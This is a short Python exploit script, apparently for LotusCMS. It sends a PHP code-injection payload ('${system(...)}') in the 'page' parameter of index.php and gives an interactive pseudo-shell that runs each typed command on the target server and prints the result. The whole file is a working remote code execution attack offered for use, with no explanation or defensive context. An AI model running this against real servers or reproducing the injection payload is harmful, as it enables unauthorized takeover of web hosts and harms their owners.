#/usr/bin/python3

import time
import requests
import sys
import signal
from colored import *
from pwn import *
#Variables locales

def signal_handler(key, frame):
	print("\n\n[*] Exiting...\n")
	sys.exit(1)

signal = signal.signal(signal.SIGINT, signal_handler)

def shell(c,url):
    URL = "http://{}/index.php".format(url)
    
    payload ="index');${system('%s')};#" % (c)
    
    data={
        "page": payload
    }
    headers={
        "Content-Type": "application/x-www-form-urlencoded"
    }

    r1 = requests.post(URL,headers=headers,data=data)
    p1 = log.progress("RCE")
    p1.status("Enviando Data")
    ResponseCommand = r1.text
    p1.success("Comando Enviado Exitosamente...")
    GrepCommand = ResponseCommand.split('</html>')[-1]
    print("%s%s%s%s" % (fg('white'),bg('black'),GrepCommand,attr('reset')))
    
      

if __name__ == "__main__":
    number = len(sys.argv)
    if number == 2:
        ip = sys.argv[1]
        print(ip)
        while True:
            command = input("$~")    
            if len(command) > 0:
                shell(command,ip)
            elif command == "exit":
                print("[*] Exiting...")
                break
                sys.exit(1)
            else:
                break
    else:
        print("[*] Arguments Invalid")
        print("[*] Use is: python3 LotusCMS.py IP")